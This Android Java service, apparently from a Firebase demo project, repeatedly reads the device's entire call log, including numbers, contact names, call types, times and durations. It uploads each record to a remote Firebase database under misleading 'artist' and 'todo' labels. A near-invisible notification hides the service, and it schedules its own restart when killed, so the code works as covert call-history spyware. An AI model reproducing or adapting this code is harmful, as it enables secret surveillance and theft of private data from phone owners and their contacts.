package net.pinal.jobscheduler;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.arch.persistence.room.Room;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ParseException;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import net.pinal.db.MyDatabase;
import net.pinal.db.Todo;
import net.pinal.firebase.Artist;
import net.pinal.firebase.R;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.TimeZone;
import java.util.Timer;
import java.util.TimerTask;

import static android.support.v4.app.NotificationCompat.PRIORITY_MIN;

public class MyService extends Service {
    MyDatabase myDatabase;
    Todo updateTodo;
    DatabaseReference databaseArtists;
    public static final int notify = 3000;  //interval between two services(Here Service run every 5 Minute)
    private Handler mHandler = new Handler();   //run on another Thread to avoid crash
    private Timer mTimer = null;    //timer handling
    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    @Override
    public void onCreate() {

        //getting the reference of artists node
        myDatabase = Room.databaseBuilder(getApplicationContext(), MyDatabase.class, MyDatabase.DB_NAME)
                .fallbackToDestructiveMigration().build();
        databaseArtists = FirebaseDatabase.getInstance().getReference("artists");
        if (mTimer != null) // Cancel if already existed
            mTimer.cancel();
        else
            mTimer = new Timer();   //recreate new
        mTimer.scheduleAtFixedRate(new TimeDisplay(), 0, notify);   //Schedule task
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            prepareAndStartForeground();
        }
    }

    private void prepareAndStartForeground() {

        String CHANNEL_ID = "my_service";
        String CHANNEL_NAME = "My Background Service";



        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = null;
            channel = new NotificationChannel(CHANNEL_ID,
                    CHANNEL_NAME, NotificationManager.IMPORTANCE_NONE);
            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(channel);

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setCategory(Notification.CATEGORY_SERVICE).
                            setSmallIcon(R.drawable.ic_launcher).setPriority(PRIORITY_MIN).build();

            startForeground(101, notification);
        }



    }


    @Override
    public void onDestroy() {

        Intent restartService = new Intent(getApplicationContext(),this.getClass());
        PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(),1,
                restartService,PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(AlarmManager.ELAPSED_REALTIME,5000,pendingIntent);
        super.onDestroy();
        Toast.makeText(this, "Service is Destroyed", Toast.LENGTH_SHORT).show();

    }


    //class TimeDisplay for handling task
    class TimeDisplay extends TimerTask {
        @Override
        public void run() {
            // run on another thread
            mHandler.post(new Runnable() {
                @Override
                public void run() {
                    // display toast
                    Toast.makeText(MyService.this, "Service is running", Toast.LENGTH_SHORT).show();

                    Log.d("Call Recoding",getCallDetails());
                }
            });
        }
    }
    public  String getCallDetails() {


        String phNumber = "";
        String callType="";
        String callDate="" ;
        String callname="";
        Date callDayTime = null;
        String callDuration="";
        String dir = null;
        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        final int  name =cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        while (cursor.moveToNext()) {
            phNumber = cursor.getString(number);
            callType = cursor.getString(type);
           callDate = cursor.getString(date);
           callname=cursor.getString(name);
           callDayTime = new Date(Long.valueOf(callDate));
             callDuration = cursor.getString(duration);

            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " +  getFormattedDateTime("EEE MMM dd HH:mm:ss zzz yyyy"
                    ,"dd MMM,yyyy HH:mm aa", callDayTime.toString())
                    + " \nCall duration in sec :--- " + callDuration);


            Todo todo = new Todo();
            todo.artistName = phNumber +" "+ callname ;
            todo.time =  getFormattedDateTime("EEE MMM dd HH:mm:ss zzz yyyy"
                    ,"dd MMM,yyyy HH:mm aa", callDayTime.toString());
            todo.artistGenre = dir;
            todo.uploaded="No";
            checkExist( todo);
            stringBuffer.append("\n----------------------------------");
        }

        loadAllTodos();
        cursor.close();
        return stringBuffer.toString();
    }
    @SuppressLint("StaticFieldLeak")
    private void loadAllTodos() {
        new AsyncTask<String, Void, List<Todo>>() {
            @Override
            protected List<Todo> doInBackground(String... params) {
                return myDatabase.daoAccess().fetchAllTodos();
            }

            @Override
            protected void onPostExecute(List<Todo> todoList) {
                    for (int p=0;p<todoList.size();p++){

                        if (todoList.get(p).uploaded.equals("No")) {

                            String id = databaseArtists.push().getKey();
                            Artist artist1 = new Artist(id,
                                    todoList.get(p).artistName ,
                                    todoList.get(p).artistGenre, todoList.get(p).time);
                            //Saving the Artist
                            databaseArtists.child(id).setValue(artist1);
                            updateTodo=new Todo();
                            updateTodo.todo_id=todoList.get(p).todo_id;
                            updateTodo.artistId=todoList.get(p).artistId;
                            updateTodo.artistName=todoList.get(p).artistName;
                            updateTodo.time= todoList.get(p).time;
                            updateTodo.artistGenre= todoList.get(p).artistGenre;
                            updateTodo.uploaded="Yes";
                            updateRow(updateTodo);
                        }
                    }
            }
        }.execute();
    }

    @SuppressLint("StaticFieldLeak")
    private void updateRow(final Todo todo) {
        new AsyncTask<Todo, Void, Integer>() {
            @Override
            protected Integer doInBackground(Todo... params) {
                return myDatabase.daoAccess().updateTodo(String.valueOf(todo.todo_id),todo.uploaded);
            }

            @Override
            protected void onPostExecute(Integer number) {
                super.onPostExecute(number);

            }
        }.execute(todo);

    }
    @SuppressLint("StaticFieldLeak")
    private void checkExist(final Todo todo) {
        new AsyncTask<Todo, Void, Void>() {
            @Override
            protected Void doInBackground(Todo... params) {
                if ( myDatabase.daoAccess().isDataExist(todo.time) == 0) {

                    insertRow(todo);
                } else {
                    // data already exist.
                }

                return null;
            }

            @Override
            protected void onPostExecute(Void id) {
                super.onPostExecute(id);

            }
        }.execute(todo);

    }
    @SuppressLint("StaticFieldLeak")
    private void insertRow(Todo todo) {
        new AsyncTask<Todo, Void, Long>() {
            @Override
            protected Long doInBackground(Todo... params) {
                return myDatabase.daoAccess().insertTodo(params[0]);
            }

            @Override
            protected void onPostExecute(Long id) {
                super.onPostExecute(id);

            }
        }.execute(todo);

    }
    //formate date
    private String getFormattedDateTime( String inputFormat,  String outputFormat,  String value) {
        // TODO Auto-generated method stub
        SimpleDateFormat curFormater = new SimpleDateFormat(inputFormat, Locale.ENGLISH);
        curFormater.setTimeZone(TimeZone.getTimeZone("CST"));

        Date dateObj= null;
        try {
            dateObj = curFormater.parse(value);
        } catch (ParseException e) {
            e.printStackTrace();
        } catch (java.text.ParseException e) {
            e.printStackTrace();
        }
        SimpleDateFormat postFormater = new SimpleDateFormat("");

        postFormater = new SimpleDateFormat(outputFormat, Locale.ENGLISH);

        return postFormater.format(dateObj);
    }

}